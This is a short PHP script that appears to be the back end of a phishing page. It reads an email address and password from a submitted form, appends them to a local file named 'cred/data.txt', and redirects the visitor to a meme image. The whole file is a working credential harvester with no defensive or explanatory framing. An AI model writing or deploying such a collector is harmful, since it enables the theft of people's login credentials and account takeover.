<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$txt =  "\n".$email."\t\t\t\t\t\t\t\t\t\t".$pass;
$myfile = fopen("cred/data.txt", "a") or die("Unable to open file!");
fwrite($myfile, $txt);
fclose($myfile);
header('Location: '.'http://i.imgflip.com/1ffsax.jpg');
?>
